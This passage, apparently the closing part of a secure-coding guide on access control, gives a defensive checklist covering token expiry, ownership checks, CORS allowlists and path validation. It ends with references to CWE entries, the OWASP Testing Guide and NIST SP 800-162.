- [ ] Use a centralized access control mechanism rather than scattering checks across handlers
- [ ] Log all access control failures and alert on anomalies
- [ ] Rate-limit API and controller access to minimize mass data harvesting
- [ ] Invalidate JWT and session tokens on logout
- [ ] Use short-lived access tokens (15 minutes or less) with refresh token rotation
- [ ] Enforce record-level ownership checks (include `user_id` in every query)
- [ ] Disable directory listing on web servers
- [ ] Remove debug endpoints and test accounts from production
- [ ] Use CORS allowlists, never reflect the Origin header
- [ ] Validate all file paths against a base directory

## References

- CWE-200: Exposure of Sensitive Information
- CWE-284: Improper Access Control
- CWE-285: Improper Authorization
- CWE-352: Cross-Site Request Forgery
- CWE-639: Authorization Bypass Through User-Controlled Key
- OWASP Testing Guide: Authorization Testing
- NIST SP 800-162: Guide to Attribute Based Access Control
